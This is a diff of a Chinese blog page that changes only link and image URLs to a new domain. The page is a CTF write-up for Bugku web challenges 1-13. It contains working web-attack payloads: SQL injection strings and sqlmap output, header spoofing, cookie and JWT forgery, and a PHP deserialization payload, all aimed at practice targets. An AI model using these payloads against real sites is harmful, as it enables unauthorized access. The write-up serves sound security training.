@@ -4,10 +4,10 @@
   <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>CTF 论剑场 Web1-13 WriteUp | 3ND</title>
-<link rel="shortcut icon" href="https://github.com/inspiringz/inspiringz.github.io/favicon.ico?v=1627821474317">
+<link rel="shortcut icon" href="https://3nd.xyz/favicon.ico?v=1627821697412">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
-<link rel="stylesheet" href="https://github.com/inspiringz/inspiringz.github.io/styles/main.css">
-<link rel="alternate" type="application/atom+xml" title="CTF 论剑场 Web1-13 WriteUp | 3ND - Atom Feed" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml">
+<link rel="stylesheet" href="https://3nd.xyz/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="CTF 论剑场 Web1-13 WriteUp | 3ND - Atom Feed" href="https://3nd.xyz/atom.xml">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
 
 
@@ -29,8 +29,8 @@ extract — 从数组中将变量导入到当前的符号表，trim — 去除�
   <div class="main">
     <div class="main-content">
       <div class="site-header">
-  <a href="https://github.com/inspiringz/inspiringz.github.io">
-  <img class="avatar" src="https://github.com/inspiringz/inspiringz.github.io/images/avatar.png?v=1627821474317" alt="">
+  <a href="https://3nd.xyz">
+  <img class="avatar" src="https://3nd.xyz/images/avatar.png?v=1627821697412" alt="">
   </a>
   <h1 class="site-title">
     3ND
@@ -99,11 +99,11 @@ extract — 从数组中将变量导入到当前的符号表，trim — 去除�
               <span class="page-view" key="20190425205800" title="CTF 论剑场 Web1-13 WriteUp">
               </span>
               
-                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/writeup/" class="post-tag">
+                <a href="https://3nd.xyz/tag/writeup/" class="post-tag">
                   # Writeup
                 </a>
                 
-                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/ctf/" class="post-tag">
+                <a href="https://3nd.xyz/tag/ctf/" class="post-tag">
                   # CTF
                 </a>
                 
@@ -116,7 +116,7 @@ extract — 从数组中将变量导入到当前的符号表，trim — 去除�
 <p>平台地址：<a href="https://new.bugku.com/">https://new.bugku.com/</a></p>
 </blockquote>
 <h2 id="web1-simple-bypass">web1 simple bypass</h2>
-<figure data-type="image" tabindex="1"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551542788618-06d2b6ca-1a0f-4e81-be52-3a6131923bcd.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://3nd.xyz/post-images/move/1551542788618-06d2b6ca-1a0f-4e81-be52-3a6131923bcd.png" alt="" loading="lazy"></figure>
 <p><strong>extract</strong> — 从数组中将变量导入到当前的符号表，<strong>trim</strong> — 去除字符串首尾处的空白字符（或者其他字符）。</p>
 <p>Payload:<code>a=&amp;b=</code>即可成功绕过，回显<code>flag{c3fd1661da5efb989c72b91f3c378759}</code>。</p>
 <h2 id="web2-quick-calc">web2 Quick calc</h2>
@@ -150,10 +150,10 @@ print(res.text)
 </code></pre>
 <p>即可获得<code>flag{b37d6bdd7bb132c7c7f6072cd318697c}</code>。</p>
 <h2 id="web3-php伪协议">web3 php伪协议</h2>
-<figure data-type="image" tabindex="2"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551601290062-7fe40dd9-5f11-4bdb-83d7-45510e4d63ba.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://3nd.xyz/post-images/move/1551601290062-7fe40dd9-5f11-4bdb-83d7-45510e4d63ba.png" alt="" loading="lazy"></figure>
 <p>尝试上传<code>php</code>文件时回显<code>Sorry, only PNG files are allowed.</code>。</p>
 <p>判断为服务端白名单验证，这里参考<code>upload-labs</code>题解思路进行测试。</p>
-<figure data-type="image" tabindex="3"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551601844340-2598aaa1-71ac-4ae1-88b4-b023e390a8e7.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://3nd.xyz/post-images/move/1551601844340-2598aaa1-71ac-4ae1-88b4-b023e390a8e7.png" alt="" loading="lazy"></figure>
 <p>测试无果,发现<code>url</code>的<code>op</code>参数首页为<code>op=home</code>上传页面为<code>op=upload</code>，猜测存在文件包含漏洞~</p>
 <p><code>op=1</code>回显：<code>Error no such page</code>。</p>
 <blockquote>
@@ -166,12 +166,12 @@ $flag=&quot;flag{e00f8931037cbdb25f6b1d82dfe5552f}&quot;;
 ?&gt;
 </code></pre>
 <h2 id="web4-万能密码">web4 万能密码</h2>
-<figure data-type="image" tabindex="4"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551617164817-353ffa97-27b8-4509-973d-0cc503b475b4.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://3nd.xyz/post-images/move/1551617164817-353ffa97-27b8-4509-973d-0cc503b475b4.png" alt="" loading="lazy"></figure>
 <p>Payload: 万能密码, 注入点在password，<code>password=' or '1'='1</code>成功登陆。</p>
 <p>flag{7ae7de60f14eb3cbd9403a0c4328598d}</p>
 <h2 id="web5-injection">web5 injection</h2>
 <p>hint: injection</p>
-<figure data-type="image" tabindex="5"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551617377026-b8dac252-2847-46ce-82e6-00d9e2797a0a.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://3nd.xyz/post-images/move/1551617377026-b8dac252-2847-46ce-82e6-00d9e2797a0a.png" alt="" loading="lazy"></figure>
 <pre><code class="language-sql">&gt; sqlmap -u &quot;http://47.95.208.167:10005/?mod=read&amp;id=1&quot; -p &quot;id&quot; -v 3
 
 Parameter: id (GET)
@@ -210,7 +210,7 @@ Table: flag
 
 </code></pre>
 <h2 id="web6-xff-f12">web6 XFF、F12</h2>
-<figure data-type="image" tabindex="6"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551618812994-0b603a6f-4f92-4202-895e-e6802019c1f9.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://3nd.xyz/post-images/move/1551618812994-0b603a6f-4f92-4202-895e-e6802019c1f9.png" alt="" loading="lazy"></figure>
 <p>提交<code>user=admin' or '1'='1</code>、<code>pass=' or '1'='1</code>后回显：IP禁止访问，请联系本地管理员登陆，IP已被记录.</p>
 <p>猜想<code>X-Forward-For: 127.0.0.1</code>，这里通过Firefox插件X-Forwarded-For Header直接修改。</p>
 <p>提交<code>user=admin&amp;pass=admin</code>/<code>user=amdin&amp;pass=1</code>后回显：Invalid credentials! Please try again!</p>
@@ -219,9 +219,9 @@ Table: flag
 <p>登陆后回显：<code>The flag is: 85ff2ee4171396724bae20c0bd851f6b</code>.</p>
 <h2 id="web7-吃个小饼干吗">web7 吃个小饼干吗？</h2>
 <p>吃个小饼干吗？</p>
-<figure data-type="image" tabindex="7"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551619734707-686930cc-6c53-49f8-b228-cf0821b0dc66.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://3nd.xyz/post-images/move/1551619734707-686930cc-6c53-49f8-b228-cf0821b0dc66.png" alt="" loading="lazy"></figure>
 <p>注册测试用户后登陆，<code>home.php</code>页面如下：</p>
-<figure data-type="image" tabindex="8"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551619974751-9fbf6c43-3a3d-4bfe-ada4-b057fb000c30.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://3nd.xyz/post-images/move/1551619974751-9fbf6c43-3a3d-4bfe-ada4-b057fb000c30.png" alt="" loading="lazy"></figure>
 <p>任意内容提交回显相同页面。</p>
 <p>想起小饼干的翻译是cookie，在报文中发现如下cookie字段:</p>
 <pre><code class="language-http">Set-Cookie: u=351e76680321232f297a57a5a743894a0e4a801fc3
@@ -233,13 +233,13 @@ Set-Cookie: r=351e766803 d63c7ede8cb1e1c8db5e51c63fd47cff
 # d63c7ede8cb1e1c8db5e51c63fd47cff 解密明文为 limited
 </code></pre>
 <p>尝试cookie欺骗~</p>
-<figure data-type="image" tabindex="9"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551620792584-108d3bed-b625-480d-ad4b-2831a74ad4f0.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://3nd.xyz/post-images/move/1551620792584-108d3bed-b625-480d-ad4b-2831a74ad4f0.png" alt="" loading="lazy"></figure>
 <h2 id="web8-simplesqli">web8 SimpleSQLI</h2>
-<figure data-type="image" tabindex="10"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551621020730-42582aa4-6221-4dfb-ba96-bd3f9fa449db.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://3nd.xyz/post-images/move/1551621020730-42582aa4-6221-4dfb-ba96-bd3f9fa449db.png" alt="" loading="lazy"></figure>
 <p>注册测试账户后，个人信息更新页面如下：</p>
-<figure data-type="image" tabindex="11"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551947568700-bd3044d2-2fd5-4a9d-b1c0-dbcba4945c34.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://3nd.xyz/post-images/move/1551947568700-bd3044d2-2fd5-4a9d-b1c0-dbcba4945c34.png" alt="" loading="lazy"></figure>
 <p><code>dirsearch</code>下发现有<code>/.idea/workspace.xml</code>泄露以及<code>www.tar.gz</code>源码文件。</p>
-<figure data-type="image" tabindex="12"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551947763373-fdc204b3-3d33-4ebc-8262-66badae669e3.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://3nd.xyz/post-images/move/1551947763373-fdc204b3-3d33-4ebc-8262-66badae669e3.png" alt="" loading="lazy"></figure>
 <p>update.php中age处存在数字型注入点,payload如下：</p>
 <pre><code class="language-sql"># 直接回显
 (select group_concat(description) from (select description from users where username=0x61646d696e)x)
@@ -247,18 +247,18 @@ Set-Cookie: r=351e766803 d63c7ede8cb1e1c8db5e51c63fd47cff
 0|conv(hex(substr((select description from (select * from users where username like 0x61646d696e)a),1,1)), 16, 10)
 conv(hex(substr((select description from (select * from users where username regexp 0x61646d696e limit 0,1)a),1,1)), 16, 10)
 </code></pre>
-<figure data-type="image" tabindex="13"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551948009156-5c838653-e51b-4fcf-9478-6f9c36dd9401.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://3nd.xyz/post-images/move/1551948009156-5c838653-e51b-4fcf-9478-6f9c36dd9401.png" alt="" loading="lazy"></figure>
 <h2 id="web9-put-me-message">web9 PUT me message!</h2>
 <p>put me a message bugku then you can get the flag</p>
-<figure data-type="image" tabindex="14"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551947338584-12ce0c3b-56f5-44ac-8ee0-1dee87637fb9.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="14"><img src="https://3nd.xyz/post-images/move/1551947338584-12ce0c3b-56f5-44ac-8ee0-1dee87637fb9.png" alt="" loading="lazy"></figure>
 <p>Base64.decode-&gt;flag{T7l8xs9fc1nct8NviPTbn3fG0dzX9V}.</p>
 <h2 id="web10-在线日记本">web10 在线日记本</h2>
 <p>hint:JWT你需要了解一哈.</p>
-<figure data-type="image" tabindex="15"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551948585023-a00d614d-957c-40e4-8339-14bbd7098a70.png" alt="" loading="lazy"></figure>
-<figure data-type="image" tabindex="16"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551948519660-cdd3f789-bfe0-4d0e-a255-0ed216ea6a3f.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="15"><img src="https://3nd.xyz/post-images/move/1551948585023-a00d614d-957c-40e4-8339-14bbd7098a70.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://3nd.xyz/post-images/move/1551948519660-cdd3f789-bfe0-4d0e-a255-0ed216ea6a3f.png" alt="" loading="lazy"></figure>
 <p>base32.decode(&quot;NNVTU23LGEZDG===&quot;)=kk:kk123,username=kk&amp;password=kk123提交登录。</p>
-<figure data-type="image" tabindex="17"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551964938680-d46d6c0d-cb8f-4e31-964b-820ff7639840.png" alt="" loading="lazy"></figure>
-<figure data-type="image" tabindex="18"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551965072453-479286a8-aca1-430a-a054-21b8d119ce66.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="17"><img src="https://3nd.xyz/post-images/move/1551964938680-d46d6c0d-cb8f-4e31-964b-820ff7639840.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="https://3nd.xyz/post-images/move/1551965072453-479286a8-aca1-430a-a054-21b8d119ce66.png" alt="" loading="lazy"></figure>
 <p>下载<code>L3yx.php.swp</code>文件，通过<code>vi -r L3yx.php</code>:wq还原文件。</p>
 <pre><code class="language-php">&lt;html&gt;
 &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;
@@ -317,13 +317,13 @@ eyJpc3MiOiJMM3l4IiwiaWF0IjoxNTUxOTY1ODIxLCJleHAiOjE1NTE5NjU4MjYsImFjY291bnQiOiJr
 # Signature
 ImnDWj4kYTxYyGfrOt-M0LCSwYSC8VtjdTfP03MLOyg
 </code></pre>
-<figure data-type="image" tabindex="19"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551966379732-44c7c202-628b-475e-9c9b-7f4e3e1c487b.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="19"><img src="https://3nd.xyz/post-images/move/1551966379732-44c7c202-628b-475e-9c9b-7f4e3e1c487b.png" alt="" loading="lazy"></figure>
 <p>更改account为L3yx,提前计算好iat和exp构造Token发包到user.php~</p>
 <ul>
 <li><a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></li>
 </ul>
-<figure data-type="image" tabindex="20"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551967336790-04658964-70ef-4afb-b598-d518bf5c8820.png" alt="" loading="lazy"></figure>
-<figure data-type="image" tabindex="21"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551967241165-ef835703-dbac-4068-b62f-848dffa72797.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="20"><img src="https://3nd.xyz/post-images/move/1551967336790-04658964-70ef-4afb-b598-d518bf5c8820.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="21"><img src="https://3nd.xyz/post-images/move/1551967241165-ef835703-dbac-4068-b62f-848dffa72797.png" alt="" loading="lazy"></figure>
 <h2 id="web11-md5截断比较">web11 MD5截断比较</h2>
 <pre><code class="language-html">&lt;html&gt;
 &lt;title&gt;robots&lt;/title&gt;
@@ -333,7 +333,7 @@ We han't anything!
 &lt;/html&gt;
 </code></pre>
 <p>访问<code>.robots</code>发现：Disallow: /shell.php，打开/shell.php.</p>
-<figure data-type="image" tabindex="22"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552203976235-47cbb07b-bf7e-4e1b-a80f-c4912ba0b5f6.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="22"><img src="https://3nd.xyz/post-images/move/1552203976235-47cbb07b-bf7e-4e1b-a80f-c4912ba0b5f6.png" alt="" loading="lazy"></figure>
 <p>可知为md5截断比较~ 每次刷新页面匹配值会改变，这里采用短时间生成大量MD5，牺牲空间来换取时间~</p>
 <pre><code class="language-python"># -*- coding: utf-8 -*-
 import hashlib
@@ -352,11 +352,11 @@ for i in xrange(1000000000):
 f.close()
 </code></pre>
 <p>执行命令正则匹配：<code>cat gen_md5.txt | grep \(\'str</code>检索符合的MD5~</p>
-<figure data-type="image" tabindex="23"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552206054283-b41ae692-04d1-4a19-a8aa-8cd17a0575e9.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="23"><img src="https://3nd.xyz/post-images/move/1552206054283-b41ae692-04d1-4a19-a8aa-8cd17a0575e9.png" alt="" loading="lazy"></figure>
 <p>得到:flag{e2f86fb5f75da4999e6f4957d89aaca0}.</p>
 <h2 id="web12-unserialize">web12 unserialize</h2>
 <p>hint:时间好长啊</p>
-<figure data-type="image" tabindex="24"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552206455406-5a9f8909-4df0-44c7-922f-1cb8b307ae44.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="24"><img src="https://3nd.xyz/post-images/move/1552206455406-5a9f8909-4df0-44c7-922f-1cb8b307ae44.png" alt="" loading="lazy"></figure>
 <p>F12检查源代码发现注释掉的PHP代码：</p>
 <pre><code class="language-php">class Time{
 	public $flag = ******************;
@@ -427,7 +427,7 @@ else{
 <li>绕过strcmp: Php5.3之后版本使用strcmp比较一个字符串和数组的话,将不再返回-1而是返回0，构造password数组。</li>
 <li>绕过sleep(): (1)使用16进制表示<code>0x</code>开头，强制类型转化时会转化为<code>0</code>；(2)使用科学计数法绕过，<code>1.3E9</code>。</li>
 </ul>
-<figure data-type="image" tabindex="25"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552210443162-5ead5cb9-d080-4b2d-9930-4523f6b3d1c0.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="25"><img src="https://3nd.xyz/post-images/move/1552210443162-5ead5cb9-d080-4b2d-9930-4523f6b3d1c0.png" alt="" loading="lazy"></figure>
 <p>构造脚本：</p>
 <pre><code class="language-php">&lt;?php
 class Time{
@@ -449,15 +449,15 @@ echo serialize($rua);
 ?&gt;
 </code></pre>
 <p>Payload:<code>rua=O:4:&quot;Time&quot;:3:{s:4:&quot;time&quot;;s:10:&quot;0x4d7c6d00&quot;;s:8:&quot;password&quot;;a:2:{i:0;s:3:&quot;bar&quot;;i:1;s:3:&quot;foo&quot;;\}\}</code>.</p>
-<figure data-type="image" tabindex="26"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552209742559-b1448e4b-0ab4-407b-8f5c-981e329b9eee.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="26"><img src="https://3nd.xyz/post-images/move/1552209742559-b1448e4b-0ab4-407b-8f5c-981e329b9eee.png" alt="" loading="lazy"></figure>
 <h2 id="web13-to-be-faster">web13 to be faster</h2>
-<figure data-type="image" tabindex="27"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552211162455-8fc677d8-2106-4a5d-80a9-5e2f933a7c82.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="27"><img src="https://3nd.xyz/post-images/move/1552211162455-8fc677d8-2106-4a5d-80a9-5e2f933a7c82.png" alt="" loading="lazy"></figure>
 <p>用BurpSuite抓包分析如下:</p>
-<figure data-type="image" tabindex="28"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552211686579-15551a38-270c-4586-ab8d-155753597abb.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="28"><img src="https://3nd.xyz/post-images/move/1552211686579-15551a38-270c-4586-ab8d-155753597abb.png" alt="" loading="lazy"></figure>
 <p>在response Header头里发现了<code>Password</code>和<code>Hint</code>字段，base64解密<code>Password</code>后得到flag{f4970aacbacfba9e57ddbf998fa2e29d}，提交错误~</p>
 <p>Hint: Seeing is not believing, maybe you need to be faster!</p>
 <p>尝试将Password解密后flag{}里面包含的字段提交回显如下:</p>
-<figure data-type="image" tabindex="29"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552219442516-2fd466c3-8f40-4388-8cd2-983db0a869f8.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="29"><img src="https://3nd.xyz/post-images/move/1552219442516-2fd466c3-8f40-4388-8cd2-983db0a869f8.png" alt="" loading="lazy"></figure>
 <p>推测需要先发送一个请求截取Password字段，然后base解密取flag{}内包含的值作为password的值发包，速度要快。</p>
 <p>Payload:</p>
 <pre><code class="language-python">import requests
@@ -470,7 +470,7 @@ password = str(base64.b64decode(Password), 'utf-8')[5:-1]
 r2 = r.post(url, data = {'password':password})
 print(r2.text)
 </code></pre>
-<figure data-type="image" tabindex="30"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552220059150-18b9cb9e-a1f6-4e18-b8cc-85725c7ea97f.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="30"><img src="https://3nd.xyz/post-images/move/1552220059150-18b9cb9e-a1f6-4e18-b8cc-85725c7ea97f.png" alt="" loading="lazy"></figure>
 
                   </div>
                   <div class="toc-container">
@@ -509,7 +509,7 @@ print(r2.text)
               margin-bottom: 24px;
               color: #343a40;
               font-weight: lighter;text-align: left;">上一篇</div>
-              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-04-25-CTF-ljc-Web14-21-WriteUp/">
+              <a href="https://3nd.xyz/post/2019-04-25-CTF-ljc-Web14-21-WriteUp/">
                 <h3 class="post-title" style="text-align: left;">
                   CTF论剑场 Web14-21 WriteUp
                 </h3>
@@ -520,7 +520,7 @@ print(r2.text)
               margin-bottom: 24px;
               color: #343a40;
               font-weight: lighter; text-align: right;">下一篇</div>
-              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-04-25-SQLi-labs-Basic-Challenges-Less-1-22/">
+              <a href="https://3nd.xyz/post/2019-04-25-SQLi-labs-Basic-Challenges-Less-1-22/">
                 <h3 class="post-title" style="
                 text-align: right;">
                   SQLi-labs Basic Challenges
@@ -534,7 +534,7 @@ print(r2.text)
 
                                 <div class="site-footer">
   
-  <a class="rss" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml" target="_blank">
+  <a class="rss" href="https://3nd.xyz/atom.xml" target="_blank">
     <i class="ri-rss-line"></i> RSS
   </a>
 </div>
